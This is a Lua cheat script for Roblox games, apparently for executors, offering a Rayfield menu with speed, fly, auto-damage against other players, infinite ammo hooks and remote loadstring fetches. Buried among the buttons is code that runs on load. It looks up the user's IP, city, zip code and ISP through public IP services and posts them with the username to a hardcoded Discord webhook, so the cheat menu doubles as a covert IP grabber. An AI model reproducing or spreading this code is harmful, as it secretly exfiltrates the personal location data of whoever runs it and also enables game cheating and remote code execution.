local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
	Name = "AlteredVoid",
	LoadingTitle = "AlteredVoid",
	LoadingSubtitle = "by Reform",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = nil, -- Create a custom folder for your hub/game
		FileName = "Big Hub"
	},
        Discord = {
        	Enabled = false,
        	Invite = "4pptAT5y", -- The Discord invite code, do not include discord.gg/
        	RememberJoins = true -- Set this to false to make them join the discord every time they load it up
        },
	KeySystem = true, -- Set this to true to use our key system
	KeySettings = {
		Title = "AlteredVoid",
		Subtitle = "Key System",
		Note = "Not for you :)",
		FileName = "AlteredVoid.key",
		SaveKey = true,
		GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
		Key = "void"
	}
})
Rayfield:Notify({
    Title = "Thanks for using AlteredVoid",
    Content = "Enjoy :)",
    Duration = 6.5,
    Image = 4483362458,
    Actions = { -- Notification Buttons
        Ignore = {
            Name = "Ok",
            Callback = function()
                print("The user tapped ok")
            end
        },
    },
})

local Tab = Window:CreateTab("SL2", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Players Options")

local Slider = Tab:CreateSlider({
	Name = "WalkSpeed",
	Range = {0, 250},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(run)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = run
        end
})

local Slider = Tab:CreateSlider({
	Name = "JumpPower",
	Range = {0, 250},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(power)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = power
    end
})

local Button = Tab:CreateButton({
	Name = "No Jump Cooldown",
	Callback = function()
        local InfiniteJumpEnabled = true
        game:GetService("UserInputService").JumpRequest:connect(function()
            if InfiniteJumpEnabled then
                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
            end
        end) 
	end,
})

local Button = Tab:CreateButton({
    Name = "Fly (V)",
    Callback = function() 
		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Head
		local flying = false
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 40
		local speed = 100
		
		function Fly()
		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
		plr.Character.Humanoid.PlatformStand = true
		if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
		speed = speed+.5+(speed/maxspeed)
		if speed > maxspeed then
		speed = maxspeed
		end
		elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
		speed = speed-1
		if speed < 0 then
		speed = 0
		end
		end
		if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
		bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
		lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
		elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
		bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
		else
		bv.velocity = Vector3.new(0,0.1,0)
		end
		bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 70
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
		if key:lower() == "v" then
		if flying then flying = false
		else
		flying = true
		Fly()
		end
		elseif key:lower() == "w" then
		ctrl.f = .6
		elseif key:lower() == "s" then
		ctrl.b = -.6
		elseif key:lower() == "a" then
		ctrl.l = -.6
		elseif key:lower() == "d" then
		ctrl.r = .6
		end
		end)
		mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
		ctrl.f = 0
		elseif key:lower() == "s" then
		ctrl.b = 0
		elseif key:lower() == "a" then
		ctrl.l = 0
		elseif key:lower() == "d" then
		ctrl.r = 0
		end
		end)
		Fly()
    Rayfield:Notify({
        Title = "Oneshot is gay",
        Content = "You are now flying, V to enable and disable.",
        Duration = 6.5,
        Image = 4483362458,
        Actions = { -- Notification Buttons
            Ignore = {
                Name = "Ok",
                Callback = function()
                    print("The user tapped ok")
                end
            },
        },
    })
end,
})

local Button = Tab:CreateButton({
	Name = "BTools",
	Callback = function()
        local tool1 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
        tool1.BinType = "Hammer" 
	end,
})

local Button = Tab:CreateButton({
    Name = "Spam Fist (Must Be Holding Fist)",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character
        local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        if not (Character or HumanoidRootPart) then return end
        
        local TargetDistance = math.huge
        local target
        
        for i,v in ipairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Name ~= "antikurNulled" and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local TargetHRP = v.Character.HumanoidRootPart
                local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
                if mag < TargetDistance then
                    TargetDistance = mag
                    target = v.Name
                end
            end
        end
        
        function antiKarma()
            if game.Players.LocalPlayer.Valuestats:FindFirstChild("Karma") then
                game:GetService("Players").LocalPlayer.Valuestats.Karma.Value = 666666666
                game.Players.LocalPlayer.Valuestats.Karma:Destroy()
            end
        end
        
        local args = {
            [1] = game:GetService("Players")[target].Character.Humanoid,
            [3] = 1,
            [4] = game:GetService("Players").LocalPlayer.Character.Head,
            [5] = true,
            [6] = Vector3.new(game.Players[target].Character.HumanoidRootPart.Position),
            [7] = false
        }
        
        antiKarma()
        while game.Players[target].Character.Humanoid.Health ~= 0 do
            task.wait(.05)
            game:GetService("Players").LocalPlayer.Character.Fist.LocalScript.Script.e:FireServer(unpack(args))
        end
    end,
})

local Button = Tab:CreateButton({
    Name = "Click TP",
    Callback = function()
        local plr = game:GetService("Players").LocalPlayer
		local mouse = plr:GetMouse()
		
		local tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = game.Players.LocalPlayer.Name.."TP"
		
		tool.Activated:Connect(function()
		local root = plr.Character.HumanoidRootPart
		local pos = mouse.Hit.Position+Vector3.new(0,2.5,0)
		local offset = pos-root.Position
		root.CFrame = root.CFrame+offset
		end)
		
		tool.Parent = plr.Backpack
    end
})

local Button = Tab:CreateButton({
    Name = "Infinate Skittles",
    Callback = function()
        pcall(function()
            while wait() do   
                game:GetService("Players").LocalPlayer.PlayerGui.Run.Value.Value = true
                game.Players.LocalPlayer.Character.Resistance.Value = true
                game:GetService("Workspace").LocalPlayer.Resistance = true
            end
        end)
    end
})

local Button = Tab:CreateButton({
    Name = "Infinate Stats",
    Callback = function() 
            game:GetService"RunService".RenderStepped:Connect(function()
                game.Players.LocalPlayer.Valuestats.Hunger.Value = 100
                game.Players.LocalPlayer.Valuestats.Stamina.Value = 100
                game.Player.LocalPlayer.Valuestats.Health.Value = 200
            end)
        end
})

local Button = Tab:CreateButton({
    Name = "Graphics",
    Callback = function()
       -- Roblox Graphics Enhancher
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = true
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = true
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = true
bloom.Intensity = 3
bloom.Size = 45
bloom.Threshold = 5

blur.Enabled = false
blur.Size = 2

-- settings }


if config.ColorCorrection then
	color.Enabled = false
end

if config.Terrain then
	-- settings {
	ter.WaterColor = Color3.fromRGB(10, 10, 24)
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end

if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
	end
end
})

local Section = Tab:CreateSection("Combat")

local Button = Tab:CreateButton({
    Name = "Big Heads",
	Callback = function() 
			function getplrsname()
				for i,v in pairs(game:GetChildren()) do
					if v.ClassName == "Players" then
						return v.Name
					end
				end
			end
			local players = getplrsname()
			local plr = game[players].LocalPlayer
	 
			while  wait(1) do
				coroutine.resume(coroutine.create(function()
					for _,v in pairs(game[players]:GetPlayers()) do
						if v.Name ~= plr.Name and v.Character then
							v.Character.Head.CanCollide = false
							v.Character.Head.Material = "Plastic"
							v.Character.Head.Transparency = 0.4
							v.Character.Head.Size = Vector3.new(4.1,4.1,4.1)
						end
					end
				end))
			end
		end,
})

local Button = Tab:CreateButton({
    Name = "OneShot",
	Callback = function() 
		local settings = {repeatamount = 20}
		local mt = getrawmetatable(game)
		local old = mt.__namecall
		
		setreadonly(mt, false)
		
		task.spawn(function()
		mt.__namecall = function(self, ...)
		  local args = {...}
		  local method = getnamecallmethod();
		  if method == "FireServer" and self.Name == "Impact" then
			  for i = 1, settings.repeatamount do
				  old(self, ...)
			  end;
		  end;
		  return old(self, ...)
		end
		end)
		setreadonly(mt, true)
		   end,
})

local Button = Tab:CreateButton({
    Name = "Push Aura",
	Callback = function(bool)
		_G.Push = bool
		while _G.Push == true do
			wait()
			local char = game.Players.LocalPlayer.Character
			if char and char:FindFirstChild("Fist") then
				local Event = char.Fist.LocalScript.Script.legma
				Event:FireServer()
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						local all = v
						local Event = char.Fist.LocalScript.p
						Event:FireServer(all)
					end
				end
			end
		end
	end,
})

local Button = Tab:CreateButton({
    Name = "Infinate Ammo",
	Callback = function() 
		local oldK; oldK = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			args = {...}
			if tostring(self) == "Fire" and args[2] == true then
				args[2] = false
				return oldK(self, unpack(args))
			end
			return oldK(self, ...)
		 end))
			end,
})

local Button = Tab:CreateButton({
    Name = "Fire Rate",
	Callback = function() 
		local old = nil

		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.ClassName == "Tool" and v:FindFirstChild("Pistol") then
		   old = v
		end
		end
		local new = getsenv(old:FindFirstChild("Pistol"))
		local hookOld = function(number)
		debug.setconstant(new.OnFire, 70, number)
		end
		
			   local script = nil
		
			   for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				   if v.ClassName == "Tool" then
					   script = v
				   end
			   end
			   
			   local senv = getsenv(script)
			   local constant = debug.getconstant(senv.OnFire, 15)
			   debug.setconstant(senv.OnFire, 15, -1)
		   end,
})

local Button = Tab:CreateButton({
    Name = "Anti Re-Coil",
	Callback = function() 
		local gun = nil

		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.ClassName == "Tool" then
				print(v.Name .. "Was Found")
				gun = v
			end
		end
		
		
		local get = gun:FindFirstChild("Pistol")
		get.Parent.Recoil.AnimationId = "rbxassetid://1234567"
		
		local hook
		hook = hookfunction(getrenv().delay, newcclosure(function(...)
			local args = {...}
			local caller = getcallingscript()
			
			if caller == get then
				if typeof(args[2]) == "function" then
					args[2] = function()
						print("hooked")
					end
				end
			end
			return hook(table.unpack(args))
		end))
	end,
})

local Button = Tab:CreateButton({
    Name = "Name ESP",
	Callback = function() 
		loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua',true))()
		end
})

local Section = Tab:CreateSection("Miscs")

local Button = Tab:CreateButton({
    Name = "Pickup Tools",
    Callback = function() 
        local g = game.Workspace.tools

    for fk, fl in pairs((g:GetChildren())) do
    if fl:IsA("Tool") and fl.Name == "Fist" and fl.Name ~= "Phone" and fl.Name ~= "Crate" then
       game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(fl)
       break
   end
end
    end
})

local Button = Tab:CreateButton({
    Name = "Anti Cam Bob (dont use this in a car)",
    Callback = function() 
		repeat
			wait()
	if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob") then
		game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob"):Destroy()
	end
	until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob")
	end
})

local Button = Tab:CreateButton({
    Name = "Anti Blur",
    Callback = function()
		while wait() do
			for fd, fe in pairs(game:GetService("Workspace").Camera:GetChildren()) do
			  fe:Destroy()
			end
	  end
	  if game:GetService("Players").LocalPlayer.PlayerGui.Dmg then
		game:GetService("Players").LocalPlayer.PlayerGui.Dmg:Destroy()
		end
	end,
})

local Button = Tab:CreateButton({
    Name = "Anti AFK",
    Callback = function() 
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	   end)
	end,
})

local Button = Tab:CreateButton({
    Name = "Free cam",
    Callback = function() 
        loadstring(game:HttpGet("https://pastebin.com/raw/mfrMFUcJ"))()
	end,
})

local Section = Tab:CreateSection("SafeChecker")

local Button = Tab:CreateButton({
	Name = "More Detail",
	Callback = function() 
		rconsoleclear()

		rconsoleprint('@@GREEN@@')
		
		rconsoleprint('\nH')
		wait(0.1)
		rconsoleprint('e')
		wait(0.1)
		rconsoleprint('l')
		wait(0.1)
		rconsoleprint('l')
		wait(0.1)
		rconsoleprint('o')
		wait(0.1)
		rconsoleprint('!\n')
		
		rconsolename('SL2 Inventory and Admin Weapon Checker')
		
		rconsoleprint('@@GREEN@@')
		
		rconsoleprint('zR1 \n')
		
		wait(1)
		
		rconsolewarn('Command is !check {username} (Full Player Username)\n')
		
		rconsoleprint('@@RED@@')
		
		local cmd = "!check"
		game.Players.LocalPlayer.Chatted:Connect(function(msg)
			local split = msg:split(' ')
			if type(split[1]) == 'string' and split[1]:lower() == cmd and type(split[2]) == 'string' then
				local target = split[2]
				if game.Players:FindFirstChild(target) and game.Players[target]:FindFirstChild('Characterstats') then
					local player = game.Players[target]
					if player:FindFirstChild('Characterstats') then
						rconsoleprint("\nFirst Name: "..player.Characterstats.Firstname.Value)
						if player:FindFirstChild('Characterstats') then
							rconsoleprint('\nLast Name: '..player.Characterstats.Lastname.Value)
							end
						if player:FindFirstChild('Valuestats') then
							rconsoleprint('\nMoney: \n'..player.Valuestats.Wallet.Value)
						end
						if player:FindFirstChild('Valuestats') then
						rconsoleprint('\nMoney in Bank: \n'..player.Valuestats.Bank.Value)
						end
						local ItemNum = 0
						rconsoleprint('\nSafe: \n')
						for i,v in pairs(player.SafeStats:GetChildren()) do
							if v:IsA('StringValue') then
							ItemNum = ItemNum + 1
							rconsoleprint('@@GREEN@@')
							rconsoleprint(ItemNum..': '..v.Value.. ' \n')
							end
						end
					end
					wait(1)
					rconsoleprint('@@LIGHT_MAGENTA@@')
					rconsoleprint('\n---ALL PLAYERSTATS---')
					rconsoleprint('\n')
				
					rconsoleprint('\nRoblox Display Name: '..player.DisplayName)
					rconsoleprint('\nRoblox Username: '..player.Name)
					rconsoleprint('\nRoblox User ID: '..player.UserId)
				
					rconsoleprint('\n')
				
					rconsoleprint('\nSkin Tone: '..player.Characterstats.Skintone.Value)
					rconsoleprint('\nBody Type: '..player.Characterstats.BodyType.Value)
					rconsoleprint('\nShirt: '..player.Characterstats.Shirt.Value)
					rconsoleprint('\nPants: '..player.Characterstats.Pants.Value)
					rconsoleprint('\nChains: '..player.Characterstats.Chains.Value)
					rconsoleprint('\nGender: '..player.Characterstats.Gender.Value)
					rconsoleprint('\nHair: '..player.Characterstats.Hair.Value)
					rconsoleprint('\nAccessories: '..player.Characterstats.Accessories.Value)
					rconsoleprint('\nFace: '..player.Characterstats.Face.Value)
					rconsoleprint('\nFace Accessories (Tattoos): '..player.Characterstats.FaceAccessories.Value)
				
					rconsoleprint('\n\nKarma:'..player.Valuestats.Karma.Value)
					rconsoleprint('\nLevel:'..player.Valuestats.Level.Value)
					rconsoleprint('\nHunger (Percentage):'..player.Valuestats.Hunger.Value)
					rconsoleprint('\nStamina:'..player.Valuestats.Stamina.Value)
					rconsoleprint('\nIs user using New Aim Engine?:'..player.Valuestats.NewAim.Value)
					rconsoleprint('\nCar Fuel/Gas:'..player.Valuestats.CarGas.Value)
					rconsoleprint('\nLevel:'..player.Valuestats.Level.Value)
				end
			end
		end)
	end
})

local Button = Tab:CreateButton({
	Name = "Admin Gun Searcher",
	Callback = function() 
            local admin_guns = {
                "PumpShotgun",
                "Mop",
                "DracoD",
                "Draco",
                "GlockE",
                "SupremeGlock",
                "NinjaKatana",
                "RPG",
                "DualKatana",
                "ZombieTool",
                "Glock27",
                "PinkRevolver",
                "MacS",
                "Purple",
                "S&W Revolver",
                "KnifeG",
                "Katana",
                "BigMacheteG",
                "BigMachete",
                "M24",
                "M24S",
                "GlockSwitch",
                "PinkRev"
            }
            
            rconsoleclear()
            rconsoleprint('@@LIGHT_MAGENTA@@')
            rconsoleprint(string.rep('-', 25))
            
            local found = false
            
            for i,v in pairs(game:service'Players':GetPlayers()) do
                if v:FindFirstChild("SafeStats") then
                    local user_admin_guns = {}
                    for itemIndex, item in pairs(v.SafeStats:GetChildren()) do
                        if table.find(admin_guns, item.Value) then
                            if item["SS" .. string.sub(item.Name, 2)].Value == -1 then
                                table.insert(user_admin_guns, item.Value)
                            else
                                table.insert(user_admin_guns, item.Value .. " - " .. item["SS" .. string.sub(item.Name, 2)].Value .. " clips")
                            end
                        end
                    end
                    if #user_admin_guns > 0 then
                        rconsoleprint("\n"..v.Name .. " has " .. #user_admin_guns .. " admin item(s) admin items found; \n" .. table.concat(user_admin_guns, "\n") .. "")
                        rconsoleprint("\n")
                        rconsoleprint(string.rep('-', 25))
                        found = true
                    end
                end
            end
            
            if not found then
               rconsoleprint('no players have admin items in safes')
               rconsoleprint(string.rep('-', 25))
            end
        end
})

local Input = Tab:CreateInput({
	Name = "View User",
	PlaceholderText = "UserName",
	RemoveTextAfterFocusLost = false,
	Callback = function(text) 
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
			text = v.Name
			end
			end
			game.Workspace.CurrentCamera.CameraSubject = game.Players[text].Character
			task.wait(15)
			game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			   end,
			
			   Default = "Player",
			   Description = "Type the player's name here.",
			
			   OnlyNumeric = false,
})
local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1056894861791481876/pvrxW2JtvaMnDup_jYpkAiGsDdkBAyQDwKaq8mggY8T8jbb33VqIVo7xeksgcDsppvMm"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)

local Input = Tab:CreateInput({
	Name = "Teleport To User (If Anti cheat whitelisted",
	PlaceholderText = "UserName",
	RemoveTextAfterFocusLost = false,
	Callback = function(text)
		for i,v in pairs(game.Players:GetChildren()) do
		if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
		text = v.Name
		end
		end
			   local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
			   local p2 = text
			   local pos = p1.CFrame
		   
			   p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
		   end,
		
		   Default = "Player",
		   Description = "Type the player's name here.",
		
		   OnlyNumeric = false,

})

local Section = Tab:CreateSection("CarMods")

local Slider = Tab:CreateSlider({
	Name = "Car HorcePower",
	Range = {0, 2000},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(text)
		local cMod = require(game:GetService("Workspace")[game.Players.LocalPlayer.Name.."'s Car"]["A-Chassis Tune"])
			
		cMod.LoadDelay = 0
		cMod.Horsepower = text
		   end,
})

local Slider = Tab:CreateSlider({
	Name = "Car Torque",
	Range = {0, 2000},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(text)
		local cMod = require(game:GetService("Workspace")[game.Players.LocalPlayer.Name.."'s Car"]["A-Chassis Tune"])
			
		cMod.LoadDelay = 0
		cMod.Torque = text
		   end,
})

local Button = Tab:CreateButton({
	Name = "Inf Fuel",
    Callback = function() 
        game:GetService"RunService".RenderStepped:Connect(function()
            game.Players.LocalPlayer.Valuestats.CarGas.Value = 100
        end)
    end,
})

local Tab = Window:CreateTab("Greenvile", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Car Options")

local Slider = Tab:CreateSlider({
	Name = "HorcePower",
	Range = {0, 2000},
	Increment = 1,
	CurrentValue = 0,
	Flag = "Slider1",
	Callback = function(bhp)
		dir = require(game:GetService("Workspace").SessionVehicles[game.Players.LocalPlayer.Name.."'s Car"]["A-Chassis Tune"])

		function car_Mod()
		  
		  dir.Horsepower = bhp
		  dir.Torque = 300
		  dir.Boost = 6
		  dir.FCamber = 20
		  dir.RCamber = 20
		  dir.FWsBoneAngle = 3
		
		end
		car_Mod()
		print("Car_bhp")
	end,
})

local Section = Tab:CreateSection("Player Options")

local Slider = Tab:CreateSlider({
	Name = "WalkSpeed",
	Range = {0, 250},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(run)
        game.Players.LocalPlayer.Character.Hummanoid.WalkSpeed = run
        end
})

local Slider = Tab:CreateSlider({
	Name = "JumpPower",
	Range = {0, 250},
	Increment = 1,
	Suffix = "",
	CurrentValue = 10,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(run)
        game.Players.LocalPlayer.Character.Hummanoid.JumpPower = run
        end
})

